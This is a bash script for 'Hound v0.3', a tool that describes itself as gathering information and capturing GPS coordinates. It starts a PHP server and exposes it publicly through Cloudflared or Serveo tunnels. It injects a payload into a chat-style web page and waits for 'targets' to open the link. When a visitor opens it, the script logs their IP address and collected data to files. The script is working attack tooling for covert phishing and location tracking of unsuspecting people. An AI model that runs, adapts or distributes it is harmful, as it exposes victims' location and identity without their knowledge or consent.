#!/bin/bash
# Hound v 0.3
# Powered by TechChip
# visit https://youtube.com/techchipnet
# 

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n      ██  ██  ██████  ██   ██ ███   ██ ██████ \n' 
printf '      ██  ██ ██   ██ ██   ██ ████  ██ ██  ██ \n'
printf '      ███████ ██   ██ ██   ██ ██ ██ ██ ██  ██ \n'
printf '      ██  ██ ██   ██ ██   ██ ██  ██ ██ ██  ██ \n'
printf '      ██  ██  ██████   ██████  ██  ████ ██████  \n\n'
printf '\e[1;31m      ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
printf " \e[1;93m     Hound Ver 0.3 - by Anil Parashar [TechChip]\e[0m \n"
printf " \e[1;92m     www.techchip.net | youtube.com/techchipnet \e[0m \n"
printf " \e[1;92m     tool modify by Lokesh Kumar | I'm not a hater of TechChip \e[0m \n"
printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}


cf_server() {
if [[ -e cloudflared ]]; then
echo "Cloudflared already installed."
else
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
arch2=$(uname -a |  grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm cf.log > /dev/null 2>&1 &
cloudflared tunnel -url 127.0.0.1:$port --logfile cf.log > /dev/null 2>&1 &
sleep 10
# *** FIX APPLIED: Added A-Z to match upper-case characters in the subdomain ***
link=$(grep -o 'https://[-0-9a-zA-Z]*\.trycloudflare.com' "cf.log")
# *****************************************************************************
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link" # Double quotes added for safety
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:$port...\n"
php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
checkfound
}

serveo_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:$port...\n"
php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo tunnel...\n"
ssh -R 80:localhost:$port serveo.net > link.log 2>&1 &
sleep 10
# *** FIX APPLIED: Added A-Z to match upper-case characters in the subdomain ***
link=$(grep -o 'https://[-0-9a-zA-Z]*\.serveo.net' "link.log")
# *****************************************************************************
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link" # Double quotes added for safety
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html

default_option_server="1"
default_port="8080"

read -p $'\n\e[1;93m Choose server option:\n 1. Localhost\n 2. Cloudflared\n 3. Serveo\n\n [1/2/3]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

read -p $'\n\e[1;93m Enter custom port [Default is 8080]: \e[0m' port
port="${port:-${default_port}}"

case $option_server in
  1)
    local_server
    ;;
  2)
    cf_server
    ;;
  3)
    serveo_server
    ;;
  *)
    printf "\e[1;31m[!] Invalid option!\e[0m\n"
    exit 1
    ;;
esac
}

banner
dependencies
hound
